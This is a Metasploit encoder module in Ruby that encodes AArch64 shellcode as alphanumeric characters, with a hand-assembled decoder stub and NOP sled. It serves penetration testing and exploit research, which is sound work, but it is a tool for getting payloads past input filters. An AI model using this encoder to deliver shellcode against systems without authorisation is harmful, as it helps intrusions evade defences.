##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder
  # Rank = Msf::Ranking

  def initialize
    super(
      'Name' => 'AArch64 alphanumeric encoder',
      'Description' => %q{
        Encodes shell code into an alphanumeric string. Algorithm inspired by the paper "Shell codes from A to Z"
      },
      'Author' => 'A5t4t1ne',
      'Arch' => ARCH_AARCH64,
      'License' => MSF_LICENSE
    )
  end

  # Encodes payload
  def encode_block(state, buf)
    enc_pl = '_' * buf.length * 2 # encoding nibbles to chars -> length will be doubled

    for i in 0...buf.length do
      q = buf[i].ord
      enc_pl[2 * i] = mkchr((q >> 4) & 0xF) # c will always be between 0x41 ('A') and 0x50 ('P')
      enc_pl[2 * i + 1] = mkchr(q & 0xF)
    end

    return decode_stub(state, enc_pl)
  end

  def mkchr(ch)
    return (0x41 + ch).chr
  end

  # Generate the decode stub
  def decode_stub(_state, enc_buf)
    jump_back, nops = min_jmp_back(enc_buf)

    return 'jiL0' + # l1:         adr   x10, 0x98D2D
           "JaB\xf1" + #          subs	x10, x10, #0x98, lsl #12
           "Je4\xf1" + #          subs	x10, x10, #0xd19
           "\x4b\x01\x1f\xca" + # eor x11, x10, xzr               - start of encoded code becomes start of decoded code
           'Z3Zj'+    # "kaB\xf1" + #          subs	x11, x11, #0x98, lsl #12  - sub 622592
           'Z3Zj'+    # "kM9\xf1" + #          adds	x11, x11, #0xe53          - add 3667
           'Z3Zj'+    # "k12\xf1" + #          adds	x11, x11, #0xc8c          - add 3212
           'sBSj' + #                   ands	w19, w19, w19, lsr #16    - clear w19
           'sBSj' + #                   ands	w19, w19, w19, lsr #16
           'b2Sj' + #                   ands	w2, w19, w19, lsr #12     - clear w2
           "\x02\x02\x48\x37" + # loop: tbnz  w2, #10, #60              - branch to code after 512 iterations
           'RQA9' + #                   ldrb	w18, [x10, #84]         - load first byte
           'YUA9' + #                   ldrb	w25, [x10, #85]         - load second byte
           "Jm0\xb1" + #                adds	x10, x10, #0xc1b        - encoded_buf_index += 2
           "Je0\xf1" + #                subs	x10, x10, #0xc19
           "\x52\x02\x04\x11" + #       add w18, w18, #0x100            - sub 0x41 (upper nibble)
           "\x52\x06\x05\x51" + #       sub w18, w18, #0x141
           "\x39\x03\x04\x11" + #       add w25, w25, #0x100            - sub 0x41 (lower nibble)
           "\x39\x07\x05\x51" + #       sub w25, w25, #0x141
           "\x39\x13\x12\x2a" + #       orr w25, w25, w18, lsl #4       - assemble the nibbles to the original byte
           "\x79\x51\x01\x39" + #       strb	w25, [x11, #84]         - store original byte
           "ki0\xb1" + #                adds	x11, x11, #0xc1a        - x11++ decoded payload index
           "ke0\xf1" + #                subs	x11, x11, #0xc19
           'Bh01' + #                   adds	w2, w2, #0xc1a          - w2++ (loop counter)
           'Bd0q' + #                   subs	w2, w2, #0xc19
           "\xf3\x10\x48\x36" + #       tbz w19, #9, #0x21c             - jump into nops
           enc_buf +
           nops +
           jump_back #            tbz w19, #9, <to lbl 'loop'>     - end of decoding while-loop
  end

  def min_jmp_back(enc_buf)
    jump_back_offsets = [
      # ["3\xefO6", 0xfffffffffffffde4], # -540
      ["\x53\xed\x4f\x36", 0xfffffffffffffda8] # -600
      # ['szO6', 0xffffffffffffef4c], # -4276
    ]

    jump_back = nil
    for val in jump_back_offsets
      next if enc_buf.length + val[1] > 0xffffffffffffffff

      jump_back = val[0]
      bytes_to_fill = 0xffffffffffffffff - val[1] - enc_buf.length + 1 # plus one, because 2's complement
      nops = (bytes_to_fill / 4) - 16 # loop lbl is 16 instructions above buffer
      puts("nops: #{nops}")
      puts("buf: #{enc_buf.length}, diff: #{0xffffffffffffffff - val[1]}, real diff: #{0xffffffffffffffff - val[1] - enc_buf.length + 1}")
      break
    end

    return [jump_back, "\x1f\x20\x03\xd5" * nops] # official NOP-instructions
  end

end
